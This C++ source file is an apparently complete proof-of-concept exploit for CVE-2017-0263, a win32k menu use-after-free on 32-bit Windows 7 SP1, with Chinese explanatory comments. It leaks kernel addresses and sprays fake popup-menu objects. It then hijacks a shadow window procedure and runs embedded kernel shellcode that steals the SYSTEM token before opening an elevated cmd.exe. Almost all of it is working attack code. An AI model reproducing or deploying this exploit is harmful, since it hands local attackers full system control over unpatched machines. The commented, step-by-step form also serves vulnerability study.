//x86 win7sp1

#include <Windows.h>
#include <wingdi.h>
#include <iostream>
#include <Psapi.h>
#pragma comment(lib, "psapi.lib")



#define POCDEBUG 0

#if POCDEBUG == 1
#define POCDEBUG_BREAK() getchar()
#elif POCDEBUG == 2
#define POCDEBUG_BREAK() __debugbreak()
#else
#define POCDEBUG_BREAK()
#endif


static PVOID(__fastcall* pfnHMValidateHandle)(HANDLE, BYTE) = NULL;

static constexpr UINT num_PopupMenuCount = 2;
static constexpr UINT num_WndShadowCount = 3;
static constexpr UINT num_offset_WND_pcls = 0x64;

static HMENU hpopupMenu[num_PopupMenuCount] = { 0 };
static UINT  iMenuCreated = 0;
static BOOL  bDoneExploit = FALSE;
static DWORD popupMenuRoot = 0;
static HWND  hWindowMain = NULL;
static HWND  hWindowHunt = NULL;
static HWND  hWindowList[0x100] = { 0 };
static UINT  iWindowCount = 0;
static PVOID pvHeadFake = NULL;
static PVOID pvAddrFlags = NULL;

typedef struct _HEAD 
{
    HANDLE  h;
    DWORD   cLockObj;
} HEAD, * PHEAD;

typedef struct _THROBJHEAD 
{
    HEAD    head;
    PVOID   pti;
} THROBJHEAD, * PTHROBJHEAD;

typedef struct _DESKHEAD 
{
    PVOID   rpdesk;
    PBYTE   pSelf;
} DESKHEAD, * PDESKHEAD;

typedef struct _THRDESKHEAD 
{
    THROBJHEAD  thread;
    DESKHEAD    deskhead;
} THRDESKHEAD, * PTHRDESKHEAD;

//在利用代码中自定义结构体 SHELLCODE 以存储与利用相关的数据
typedef struct _SHELLCODE 
{
    DWORD reserved;
    DWORD pid;
    DWORD off_CLS_lpszMenuName;
    DWORD off_THREADINFO_ppi;
    DWORD off_EPROCESS_ActiveLink;
    DWORD off_EPROCESS_Token;
    PVOID tagCLS[0x100];
    BYTE  pfnWindProc[];
} SHELLCODE, * PSHELLCODE;

static PSHELLCODE pvShellCode = NULL;

// Arguments:
//    [ebp+08h]:pwnd   = pwndWindowHunt;
//!?  [ebp+0Ch]:msg    = 0x9F9F; 为了精确识别触发提权的操作，在代码中定义 0x9F9F 为触发提权的消息
//   [ebp+10h]:wParam = popupMenuRoot;
//   [ebp+14h]:lParam = NULL;
//   In kernel-mode, the first argument is tagWND pwnd.
static
BYTE
xxPayloadWindProc[] = 
{
    // Loader+0x108a:
    // Judge if the `msg` is 0x9f9f value.
    0x55,                               // push    ebp
    0x8b, 0xec,                         // mov     ebp,esp
    0x8b, 0x45, 0x0c,                   // mov     eax,dword ptr [ebp+0Ch]
    0x3d, 0x9f, 0x9f, 0x00, 0x00,       // cmp     eax,9F9Fh      ;我们首先判断传入的消息参数是否是我们自定义的提权消息
    0x0f, 0x85, 0x8d, 0x00, 0x00, 0x00, // jne     Loader+0x1128
    
    // Loader+0x109b:
    // Judge if CS is 0x1b, which means in user-mode context.
    //? 在 32 位的 Windows 操作系统中，用户上下文代码段寄存器 CS 值为 0x1B，
    //借助这个特性，在 ShellCode 函数代码中判断当前执行上下文是否在用户模式下，如是则返回失败
    0x66, 0x8c, 0xc8,                   // mov     ax,cs
    0x66, 0x83, 0xf8, 0x1b,             // cmp     ax,1Bh
    0x0f, 0x84, 0x80, 0x00, 0x00, 0x00, // je      Loader+0x1128   ;返回失败
    
    // Loader+0x10a8:
    // Get the address of pwndWindowHunt to ECX.
    // Recover the flags of pwndWindowHunt: zero bServerSideWindowProc.
    // Get the address of pvShellCode to EDX by CALL-POP.
    // Get the address of pvShellCode->tagCLS[0x100] to ESI.
    // Get the address of popupMenuRoot to EDI.
    0xfc,                               // cld
    0x8b, 0x4d, 0x08,                   // mov     ecx,dword ptr [ebp+8]
    0xff, 0x41, 0x16,                   // inc     dword ptr [ecx+16h]
    0x60,                               // pushad
    0xe8, 0x00, 0x00, 0x00, 0x00,       // call    $5
    0x5a,                               // pop     edx
    0x81, 0xea, 0x43, 0x04, 0x00, 0x00, // sub     edx,443h
    0xbb, 0x00, 0x01, 0x00, 0x00,       // mov     ebx,100h
    0x8d, 0x72, 0x18,                   // lea     esi,[edx+18h]
    0x8b, 0x7d, 0x10,                   // mov     edi,dword ptr [ebp+10h]
    
    // Loader+0x10c7:
    0x85, 0xdb,                         // test    ebx,ebx
    0x74, 0x13,                         // je      Loader+0x10de
    
    // Loader+0x10cb:
    // Judge if pvShellCode->tagCLS[ebx] == NULL
    0xad,                               // lods    dword ptr [esi]
    0x4b,                               // dec     ebx
    0x83, 0xf8, 0x00,                   // cmp     eax,0
    0x74, 0xf5,                         // je      Loader+0x10c7
    
    // Loader+0x10d2:
    // Judge if tagCLS->lpszMenuName == popupMenuRoot
    0x03, 0x42, 0x08,                   // add     eax,dword ptr [edx+8]
    0x39, 0x38,                         // cmp     dword ptr [eax],edi
    0x75, 0xee,                         // jne     Loader+0x10c7
    
    // Loader+0x10d9:
    // Zero tagCLS->lpszMenuName
    0x83, 0x20, 0x00,                   // and     dword ptr [eax],0
    0xeb, 0xe9,                         // jmp     Loader+0x10c7
    
    // Loader+0x10de:
    // Get the value of pwndWindowHunt->head.pti->ppi->Process to ECX.
    // Get the value of pvShellCode->pid to EAX.
    0x8b, 0x49, 0x08,                   // mov     ecx,dword ptr [ecx+8]
    0x8b, 0x5a, 0x0c,                   // mov     ebx,dword ptr [edx+0Ch]
    0x8b, 0x0c, 0x0b,                   // mov     ecx,dword ptr [ebx+ecx]
    0x8b, 0x09,                         // mov     ecx,dword ptr [ecx]
    0x8b, 0x5a, 0x10,                   // mov     ebx,dword ptr [edx+10h]
    0x8b, 0x42, 0x04,                   // mov     eax,dword ptr [edx+4]
    0x51,                               // push    ecx
    
    // Loader+0x10f0:
    // Judge if EPROCESS->UniqueId == pid.
    0x39, 0x44, 0x0b, 0xfc,             // cmp     dword ptr [ebx+ecx-4],eax
    0x74, 0x07,                         // je      Loader+0x10fd
    
    // Loader+0x10f6:
    // Get next EPROCESS to ECX by ActiveLink.
    0x8b, 0x0c, 0x0b,                   // mov     ecx,dword ptr [ebx+ecx]
    0x2b, 0xcb,                         // sub     ecx,ebx
    0xeb, 0xf3,                         // jmp     Loader+0x10f0
    
    // Loader+0x10fd:
    // Get current EPROCESS to EDI.
    0x8b, 0xf9,                         // mov     edi,ecx
    0x59,                               // pop     ecx
    
    // Loader+0x1100:
    // Judge if EPROCESS->UniqueId == 4
    0x83, 0x7c, 0x0b, 0xfc, 0x04,       // cmp     dword ptr [ebx+ecx-4],4
    0x74, 0x07,                         // je      Loader+0x110e
    
    // Loader+0x1107:
    // Get next EPROCESS to ECX by ActiveLink.
    0x8b, 0x0c, 0x0b,                   // mov     ecx,dword ptr [ebx+ecx]
    0x2b, 0xcb,                         // sub     ecx,ebx
    0xeb, 0xf2,                         // jmp     Loader+0x1100
    
    // Loader+0x110e:
    // Get system EPROCESS to ESI.
    // Get the value of system EPROCESS->Token to current EPROCESS->Token.
    // Add 2 to OBJECT_HEADER->PointerCount of system Token.
    // Return 0x9F9F to the caller.
    0x8b, 0xf1,                         // mov     esi,ecx
    0x8b, 0x42, 0x14,                   // mov     eax,dword ptr [edx+14h]
    0x03, 0xf0,                         // add     esi,eax
    0x03, 0xf8,                         // add     edi,eax
    0xad,                               // lods    dword ptr [esi]
    0xab,                               // stos    dword ptr es:[edi]
    0x83, 0xe0, 0xf8,                   // and     eax,0FFFFFFF8h
    0x83, 0x40, 0xe8, 0x02,             // add     dword ptr [eax-18h],2
    0x61,                               // popad
    0xb8, 0x9f, 0x9f, 0x00, 0x00,       // mov     eax,9F9Fh
    0xeb, 0x05,                         // jmp     Loader+0x112d
    
    // Loader+0x1128:
    // Failed in processing.
    0xb8, 0x01, 0x00, 0x00, 0x00,       // mov     eax,1
    
    // Loader+0x112d:
    0xc9,                               // leave
    0xc2, 0x10, 0x00,                   // ret     10h
};

/// <summary>
/// 获得HMValidateHandle函数
/// </summary>
/// <param name=""></param>
static
VOID
xxGetHMValidateHandle(VOID)
{
    HMODULE hModule = LoadLibraryA("USER32.DLL");
    PBYTE pfnIsMenu = (PBYTE)GetProcAddress(hModule, "IsMenu");
    PBYTE Address = NULL;
    for (INT i = 0; i < 0x30; i++)
    {
        if (*(WORD*)(i + pfnIsMenu) != 0x02B2)//byte
        {
            continue;
        }
        i += 2;
        if (*(BYTE*)(i + pfnIsMenu) != 0xE8)
        {
            continue;
        }
        Address = *(DWORD*)(i + pfnIsMenu + 1) + pfnIsMenu;
        Address = Address + i + 5;
        pfnHMValidateHandle = (PVOID(__fastcall*)(HANDLE, BYTE))Address;
        break;
    }
}

#define TYPE_WINDOW 1

static
PVOID
xxHMValidateHandleEx(HWND hwnd)
{
    return pfnHMValidateHandle((HANDLE)hwnd, TYPE_WINDOW);
}

static
PVOID
xxHMValidateHandle(HWND hwnd)
{
    PVOID RetAddr = NULL;
    if (!pfnHMValidateHandle)
    {
        xxGetHMValidateHandle();
    }
    if (pfnHMValidateHandle)
    {
        RetAddr = xxHMValidateHandleEx(hwnd);
    }
    return RetAddr;
}

/// <summary>
/// 函数 NtUserMNDragLeave 原本用于结束菜单的拖拽状态
/// 在该函数执行期间，系统在进行一系列的判断和调用之后，
/// 最终在函数 xxxUnlockMenuState 中调用 xxxMNEndMenuState 函数
/// </summary>
/// <param name=""></param>
static
VOID
__declspec(naked)
xxNtUserMNDragLeave(VOID)
{
    __asm { mov eax, 11ECh };
    __asm { int 2eh };
    __asm { ret };
}

/// <summary>
/// 自定义篡改的阴影hook函数 ,用于劫持执行流 再次调用 xxxMNEndMenuState 函数
/// </summary>
/// <param name="hwnd"></param>
/// <param name="msg"></param>
/// <param name="wParam"></param>
/// <param name="lParam"></param>
/// <returns></returns>
static
LRESULT
WINAPI
xxShadowWindowProc(
    _In_ HWND   hwnd,
    _In_ UINT   msg,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
)
{
    //判断消息参数是否为 WM_NCDESTROY 类型。
    //如果是的话，则在此直接调用 NtUserMNDragLeave 系统服务。
    if (msg != WM_NCDESTROY || bDoneExploit)
    {
        return DefWindowProcW(hwnd, msg, wParam, lParam);
    }
    std::cout << "::" << __FUNCTION__ << std::endl;
    POCDEBUG_BREAK();
    
    //在验证代码的自定义阴影窗口消息处理函数 xxShadowWindowProc 中调用系统服务 NtUserMNDragLeave 之前，
    //!? 增加对前面批量创建的普通窗口对象设置 GCL_MENUNAME 的调用
    DWORD dwPopupFake[0xD] = { 0 };
    dwPopupFake[0x0] = (DWORD)0x00098208;  //->flags
    dwPopupFake[0x1] = (DWORD)pvHeadFake;  //->spwndNotify
    dwPopupFake[0x2] = (DWORD)pvHeadFake;  //->spwndPopupMenu
    dwPopupFake[0x3] = (DWORD)pvHeadFake;  //->spwndNextPopup
    dwPopupFake[0x4] = (DWORD)pvAddrFlags - 4; //->spwndPrevPopup
    dwPopupFake[0x5] = (DWORD)pvHeadFake;  //->spmenu
    dwPopupFake[0x6] = (DWORD)pvHeadFake;  //->spmenuAlternate
    dwPopupFake[0x7] = (DWORD)pvHeadFake;  //->spwndActivePopup
    dwPopupFake[0x8] = (DWORD)0xFFFFFFFF;  //->ppopupmenuRoot
    dwPopupFake[0x9] = (DWORD)pvHeadFake;  //->ppmDelayedFree
    dwPopupFake[0xA] = (DWORD)0xFFFFFFFF;  //->posSelectedItem
    dwPopupFake[0xB] = (DWORD)pvHeadFake;  //->posDropped
    dwPopupFake[0xC] = (DWORD)0;
    for (UINT i = 0; i < iWindowCount; ++i)
    {
        //	为普通窗口对象设置 MENUNAME 字段
        //GCL_MENUNAME：获得菜单名字符串的地址，该字符串标识了与类有关的菜单资源。
        SetClassLongW(hWindowList[i], GCL_MENUNAME, (LONG)dwPopupFake);
    }
    xxNtUserMNDragLeave();//!? 劫持执行流 再次调用 xxxMNEndMenuState 函数

    //对载体窗口对象发送自定义提权消息 0x9F9F 的调用语句
    LRESULT Triggered = SendMessageW(hWindowHunt, 0x9F9F, popupMenuRoot, 0);
    bDoneExploit = Triggered == 0x9F9F;//并将返回值的判断结果存储在全局变量 bDoneExploit 中
    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

#define MENUCLASS_NAME L"#32768"

/// <summary>
///自定义的挂钩处理函数 弹出窗口和阴影窗口创建时都会调用到这个函数
/// </summary>
/// <param name="code"></param>
/// <param name="wParam"></param>
/// <param name="lParam"></param>
/// <returns></returns>
static
LRESULT
CALLBACK
xxWindowHookProc(INT code, WPARAM wParam, LPARAM lParam)
{
    //根据参数 lParam 指向 tagCWPSTRUCT 对象的成员域 message 判断当前处理的消息是否为 WM_NCCREATE 消息
    tagCWPSTRUCT* cwp = (tagCWPSTRUCT*)lParam;
    static HWND hwndMenuHit = 0;
    static UINT iShadowCount = 0;
    //不是的情况则直接忽略
    if (bDoneExploit || iMenuCreated != num_PopupMenuCount - 2 || cwp->message != WM_NCCREATE)
    {
        return CallNextHookEx(0, code, wParam, lParam);
    }
    std::cout << "::" << __FUNCTION__ << std::endl;
    
    
    WCHAR szTemp[0x20] = { 0 };//保存窗口类名称
    GetClassNameW(cwp->hwnd, szTemp, 0x14);//根据窗口句柄获取窗口对象的类名称
    
    /*
    在函数 xxxEndMenuLoop 调用期间，
    系统对每个弹出菜单窗口对象都调用了两次 xxxRemoveShadow 函数。
    这将导致在到达漏洞触发位置之前阴影窗口被提前取消关联和销毁。
    因此我们要想办法为成员域 uButtonDownHitArea 存储的目标菜单窗口对象创建并关联至少 3 个阴影窗口对象
    */
    if (!wcscmp(szTemp, L"SysShadow") && hwndMenuHit != NULL)//!? 类型为 SysShadow 的阴影窗口对象
    {
        //对进入次数进行计数
        std::cout << "::iShadowCount=" << iShadowCount << std::endl;
        POCDEBUG_BREAK();
        if (++iShadowCount == num_WndShadowCount)//? 到第 3 次进入的情况时
        {
            //调用函数 SetWindowLong 将目标阴影窗口对象的消息处理函数篡改为自定义的阴影窗口消息处理函数
            // GWL_WNDPROC : 设置一个新的消息处理函数
            SetWindowLongW(cwp->hwnd, GWL_WNDPROC, (LONG)xxShadowWindowProc);
        }
        else
        {
            //? 对前 2 次进入的情况调用函数 SetWindowPos 以触发创建新的阴影窗口关联的逻辑
            /*
            在执行流进入自定义挂钩处理函数的 SysShadow 处理逻辑时，
            在内核中正处于创建阴影窗口的 xxxCreateWindowEx 执行期间，
            此时创建的阴影窗口对象和原菜单窗口对象还没有关联起来，它们的关联关系尚未被插入 gpShadowFirst 链表中。
            此时对目标菜单对象调用 SetWindowPos 以设置 SWP_SHOWWINDOW 状态标志，
            将导致系统对目标菜单窗口创建并关联多个阴影窗口对象，后创建的阴影窗口对象将被先插入 gpShadowFirst 链表中，
            从而位于链表中更靠后的位置 
            */
            // 先隐藏SWP_HIDEWINDOW
            //再显示SWP_SHOWWINDOW就可以再次创建阴影窗口
            SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_HIDEWINDOW);
            SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_SHOWWINDOW);
        }
    }
    else if (!wcscmp(szTemp, MENUCLASS_NAME))//!? 当类名称为 #32768 时 表示这是创建的菜单窗口对象
    {
        hwndMenuHit = cwp->hwnd;//因此将该句柄记录下来以备后续引用
        std::cout << "::hwndMenuHit=" << hwndMenuHit << std::endl;
    }
    return CallNextHookEx(0, code, wParam, lParam);
}

#define MN_ENDMENU 0x1F3


/// <summary>
/// 自定义的通知hook函数 每当进入该事件通知处理程序时，代表当前新的弹出菜单已显示在屏幕中
/// </summary>
/// <param name="hWinEventHook"></param>
/// <param name="event"></param>
/// <param name="hwnd"></param>
/// <param name="idObject"></param>
/// <param name="idChild"></param>
/// <param name="idEventThread"></param>
/// <param name="dwmsEventTime"></param>
static
VOID
CALLBACK
xxWindowEventProc(
    HWINEVENTHOOK hWinEventHook,
    DWORD         event,
    HWND          hwnd,
    LONG          idObject,
    LONG          idChild,
    DWORD         idEventThread,
    DWORD         dwmsEventTime
)
{
    UNREFERENCED_PARAMETER(hWinEventHook);
    UNREFERENCED_PARAMETER(event);
    UNREFERENCED_PARAMETER(idObject);
    UNREFERENCED_PARAMETER(idChild);
    UNREFERENCED_PARAMETER(idEventThread);
    UNREFERENCED_PARAMETER(dwmsEventTime);
    std::cout << "::" << __FUNCTION__ << std::endl;
    if (iMenuCreated == 0)
    {
        popupMenuRoot = *(DWORD*)((PBYTE)xxHMValidateHandle(hwnd) + 0xb0);
    }
    if (++iMenuCreated >= num_PopupMenuCount)//!? 当第 2 次进入函数 xxWindowEventProc 时，表示弹出的子菜单已在屏幕中显示。
    {
        //此时验证代码调用函数 SendMessage 向目标子菜单窗口对象发送 MN_ENDMENU 菜单终止的消息，
        //这将导致执行流最终进入内核函数 xxxMNEndMenuState 中
        std::cout << ">>SendMessage(MN_ENDMENU)" << std::endl;
        POCDEBUG_BREAK();
        SendMessageW(hwnd, MN_ENDMENU, 0, 0);
    }
    else//当第 1 次进入函数时，表示根弹出菜单已在屏幕中显示
    {
        //因此通过调用函数 SendMessage 向参数句柄 hwnd 指向的菜单窗口对象发送 WM_LBUTTONDOWN 鼠标左键按下的消息，
        //并在参数 lParam 传入按下的相对坐标
        //在内核中消息处理函数 xxxMenuWindowProc 接收并处理该消息
        //这将导致最终调用到函数 xxxMNOpenHierarchy 以创建新弹出的子菜单的相关对象。
        //类似地，在处理完成新的子菜单在屏幕中的显示时，
         //函数 xxxMNOpenHierarchy 调用函数 xxxWindowEvent 发送 EVENT_SYSTEM_MENUPOPUPSTART 事件通知。
         //!? 这使得执行流再次进入自定义事件通知处理函数 xxWindowEventProc 中
        std::cout << ">>SendMessage(WM_LBUTTONDOWN)" << std::endl;
        POCDEBUG_BREAK();
        SendMessageW(hwnd, WM_LBUTTONDOWN, 1, 0x00020002);
    }
}

/// <summary>
/// 注册窗口类
/// </summary>
/// <param name="lpszClassName"></param>
/// <param name="cbWndExtra"></param>
/// <returns></returns>
static
BOOL
xxRegisterWindowClassW(LPCWSTR lpszClassName, INT cbWndExtra)
{
    WNDCLASSEXW wndClass = { 0 };
    wndClass = { 0 };
    wndClass.cbSize = sizeof(WNDCLASSEXW);
    wndClass.lpfnWndProc = DefWindowProcW;
    wndClass.cbWndExtra = cbWndExtra;
    wndClass.hInstance = GetModuleHandleA(NULL);
    wndClass.lpszMenuName = NULL;
    wndClass.lpszClassName = lpszClassName;
    return RegisterClassExW(&wndClass);
}

static
HWND
xxCreateWindowExW(LPCWSTR lpszClassName, DWORD dwExStyle, DWORD dwStyle)
{
    return CreateWindowExW(dwExStyle,
        lpszClassName,
        NULL,
        dwStyle,
        0,
        0,
        1,
        1,
        NULL,
        NULL,
        GetModuleHandleA(NULL),
        NULL);
}

/// <summary>
/// 创建cmd命令行进程
/// </summary>
/// <param name=""></param>
static
VOID xxCreateCmdLineProcess(VOID)
{
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;
    WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
    BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

/// <summary>
/// 漏洞触发函数
/// </summary>
/// <param name="lpThreadParameter"></param>
/// <returns></returns>
static
DWORD
WINAPI
xxTrackExploitEx(LPVOID lpThreadParameter)
{
    UNREFERENCED_PARAMETER(lpThreadParameter);
    std::cout << "::" << __FUNCTION__ << std::endl;
    POCDEBUG_BREAK();
    //! 由于模态的菜单将导致线程在内核中进入函数 xxxMNLoop 的循环等待状态，导致无法在同一线程中执行其他操作，
    //! 对漏洞触发造成难度，因此我们选择非模态的菜单类型
    for (INT i = 0; i < num_PopupMenuCount; i++)//创建两个菜单0 1
    {
        MENUINFO mi = { 0 };
        // 用 CreatePopupMenu 创建的菜单是空的，后面用 AppendMenu 来添加 items
        hpopupMenu[i] = CreatePopupMenu();
        mi.cbSize = sizeof(mi);
        mi.fMask = MIM_STYLE;// MIM_STYLE 表明要设置 dwStyle 这个标志位
        //autodismiss 鼠标移到菜单窗口外面一会儿窗口会自动消失
        // modeless 非模态 
        // dragdrop 拖放窗口
        mi.dwStyle = MNS_AUTODISMISS | MNS_MODELESS | MNS_DRAGDROP;
        SetMenuInfo(hpopupMenu[i], &mi);
    }

    //接下来通过 AppendMenuA 为两个菜单添加菜单项，并使第二个成为第一个的子菜单
    for (INT i = 0; i < num_PopupMenuCount; i++)
    {
        LPCSTR szMenuItem = "item";
        AppendMenuA(hpopupMenu[i],
            MF_BYPOSITION | MF_POPUP,
            (i >= num_PopupMenuCount - 1) ? 0 : (UINT_PTR)hpopupMenu[i + 1],
            szMenuItem);
        //xAppendMenuA(hpopupMenu[0], MF_BYPOSITION | MF_POPUP, (UINT_PTR)hpopupMenu[1], szMenuItem);
        //AppendMenuA(hpopupMenu[1], MF_BYPOSITION | MF_POPUP, 0, szMenuItem);
    }
    //在阴影窗口自定义消息处理函数 xxShadowWindowProc 执行期间，
    //! 需要通过相关函数在内核中分配与 tagPOPUPMENU 结构体相同大小的缓冲区以占位刚释放的内存空隙，
    //! 伪造新的弹出菜单对象，使系统误认为弹出菜单对象仍旧正常存在于内核中。
    //在此时机增加调用函数 CreateWindowEx 以创建大量窗口对象，并为每个窗口对象注册单独的窗口类。
    for (INT i = 0; i < 0x100; i++)
    {
        WNDCLASSEXW Class = { 0 };
        WCHAR szTemp[20] = { 0 };
        HWND hwnd = NULL;
        wsprintfW(szTemp, L"%x-%d", rand(), i);
        Class.cbSize = sizeof(WNDCLASSEXA);
        Class.lpfnWndProc = DefWindowProcW;
        Class.cbWndExtra = 0;
        Class.hInstance = GetModuleHandleA(NULL);
        Class.lpszMenuName = NULL;
        Class.lpszClassName = szTemp;
        if (!RegisterClassExW(&Class))//注册
        {
            continue;
        }
        //创建
        hwnd = CreateWindowExW(0, szTemp, NULL, WS_OVERLAPPED,
            0,
            0,
            0,
            0,
            NULL,
            NULL,
            GetModuleHandleA(NULL),
            NULL);
        if (hwnd == NULL)
        {
            continue;
        }
        hWindowList[iWindowCount++] = hwnd;//记录所有句柄的表
    }
    //调用xxHMValidateHandle泄露内核地址
    for (INT i = 0; i < iWindowCount; i++)
    {
        pvShellCode->tagCLS[i] = *(PVOID*)((PBYTE)xxHMValidateHandle(hWindowList[i]) + num_offset_WND_pcls);
    }

    DWORD fOldProtect = 0;
    VirtualProtect(pvShellCode, 0x1000, PAGE_EXECUTE_READ, &fOldProtect);//设置可执行读

    
    xxRegisterWindowClassW(L"WNDCLASSMAIN", 0x000);//注册窗口类WNDCLASSMAIN
    hWindowMain = xxCreateWindowExW(L"WNDCLASSMAIN",WS_EX_LAYERED | WS_EX_TOOLWINDOW | WS_EX_TOPMOST,WS_VISIBLE);
    
    //? 增加创建新的用作利用载体的普通窗口对象 hWindowHunt 
    xxRegisterWindowClassW(L"WNDCLASSHUNT", 0x200);
    hWindowHunt = xxCreateWindowExW(L"WNDCLASSHUNT",WS_EX_LEFT,WS_OVERLAPPED);
    //通过 HMValidateHandle 内核对象地址泄露技术获取载体窗口对象的 tagWND 内核地址
    //窗口对象 tagWND 的头部结构是一个 THRDESKHEAD 成员结构体对象
    PTHRDESKHEAD head = (PTHRDESKHEAD)xxHMValidateHandle(hWindowHunt);
    PBYTE pbExtra = head->deskhead.pSelf + 0xb0 + 4;
    pvHeadFake = pbExtra + 0x44;
    
    for (UINT x = 0; x < 0x7F; x++)
    {
        SetWindowLongW(hWindowHunt, sizeof(DWORD) * (x + 1), (LONG)pbExtra);
    }
    PVOID pti = head->thread.pti;
    SetWindowLongW(hWindowHunt, 0x28, 0);
    SetWindowLongW(hWindowHunt, 0x50, (LONG)pti); // pti
    SetWindowLongW(hWindowHunt, 0x6C, 0);
    SetWindowLongW(hWindowHunt, 0x1F8, 0xC033C033);
    SetWindowLongW(hWindowHunt, 0x1FC, 0xFFFFFFFF);

    //! 在创建普通窗口对象时，如果样式参数 dwStyle 和扩展样式参数 dwExStyle 都传值为 0 默认值，
    //那么在内核中成员域 bDialogWindow 和 bHasCreatestructName 都将未被置位
    //通过内核地址泄露技术获取窗口对象成员域 bDialogWindow 的地址的调用
    pvAddrFlags = *(PBYTE*)((PBYTE)xxHMValidateHandle(hWindowHunt) + 0x10) + 0x16;

    //接着将先前初始化的结构体 SHELLCODE 对象的成员域 pfnWindProc 起始地址设置为载体窗口对象 hWindowHunt 的消息处理函数
    SetWindowLongW(hWindowHunt, GWL_WNDPROC, (LONG)pvShellCode->pfnWindProc);

    //设置 窗口过程函数 挂钩 自定义函数
    SetWindowsHookExW(WH_CALLWNDPROC, //! 设置 WH_CALLWNDPROC 类型的挂钩程序会在每次线程将消息发送给窗口对象之前调用
        xxWindowHookProc,//过程函数hook
        GetModuleHandleA(NULL),
        GetCurrentThreadId());

    //通过 SetWinEventHook 创建范围包含 EVENT_SYSTEM_MENUPOPUPSTART 的关联当前进程和线程的事件通知消息处理程序
    SetWinEventHook(EVENT_SYSTEM_MENUPOPUPSTART, //! 事件通知 EVENT_SYSTEM_MENUPOPUPSTART 表示目标弹出菜单已被显示在屏幕上
        EVENT_SYSTEM_MENUPOPUPSTART,
        GetModuleHandleA(NULL),
        xxWindowEventProc,//事件函数hook
        GetCurrentProcessId(),
        GetCurrentThreadId(),
        0);
    
    //调用函数 TrackPopupMenuEx 使第一个菜单作为根菜单在创建的窗口中弹出
    //! TrackPopupMenuEx 在内核中进入 xxxTrackPopupMenuEx 函数
    TrackPopupMenuEx(hpopupMenu[0], 0, 0, 0, hWindowMain, NULL);

    //!? 调用 GetMessage 和 DispatchMessage 等函数在当前线程中实现消息循环
    MSG msg = { 0 };
    while (GetMessageW(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return 0;
}

/// <summary>
/// 漏洞POC
/// </summary>
/// <param name=""></param>
/// <returns></returns>
INT POC_CVE20170263(VOID)
{
    std::cout << "-------------------" << std::endl;
    std::cout << "POC - CVE-2017-0263" << std::endl;
    std::cout << "-------------------" << std::endl;
    
    //分配内存空间
    pvShellCode = (PSHELLCODE)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pvShellCode == NULL)
    {
        return 0;
    }
    ZeroMemory(pvShellCode, 0x1000);//初始化
    //填充结构体 里面是一些窃取令牌的偏移
    pvShellCode->pid = GetCurrentProcessId();//pid
    pvShellCode->off_CLS_lpszMenuName = 0x050;
    pvShellCode->off_THREADINFO_ppi = 0x0b8;
    pvShellCode->off_EPROCESS_ActiveLink = 0x0b8;
    pvShellCode->off_EPROCESS_Token = 0x0f8;
    //将payload复制到空间中 成员域 pfnWindProc 起始的内存区域将最终作为实际 ShellCode 函数代码在内核上下文执行
    CopyMemory(pvShellCode->pfnWindProc, xxPayloadWindProc, sizeof(xxPayloadWindProc));

    
    std::cout << "CREATE WORKER THREAD..." << std::endl;
    POCDEBUG_BREAK();//断点
    HANDLE hThread = CreateThread(NULL, 0, xxTrackExploitEx, NULL, 0, NULL);//创建线程执行exp
    if (hThread == NULL)
    {
        return FALSE;
    }
    while (!bDoneExploit)
    {
        Sleep(500);
    }
    xxCreateCmdLineProcess();//打开cmd
    DestroyWindow(hWindowMain);
    TerminateThread(hThread, 0);
    std::cout << "-------------------" << std::endl;
    getchar();
    return bDoneExploit;
}

/// <summary>
/// 主函数入口
/// </summary>
/// <param name="argc"></param>
/// <param name="argv"></param>
/// <returns></returns>
INT main(INT argc, CHAR* argv[])
{
    POC_CVE20170263();
    return 0;
}